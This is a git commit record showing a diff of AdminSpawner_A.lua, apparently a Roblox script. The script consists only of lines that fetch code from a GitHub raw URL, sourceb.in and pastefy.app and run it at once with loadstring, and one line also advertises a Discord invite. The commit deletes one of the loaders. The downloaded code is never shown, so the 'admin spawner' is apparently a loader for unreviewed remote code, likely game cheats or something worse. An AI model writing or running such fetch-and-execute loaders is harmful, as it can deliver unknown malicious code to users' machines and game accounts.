ee97d89b19e56934f869d73673ffe92afc787329
ter4x <anonymous7002002@gmail.com>
2025-07-20 11:18:31 +0800

    Update AdminSpawner_A.lua

--- AdminSpawner_A.lua
+++ AdminSpawner_A.lua
@@ -1,3 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/ETMJto01W1/0", true))()
-loadstring(game:HttpGet("https://pastefy.app/sZ5sM4Cz/raw"))()
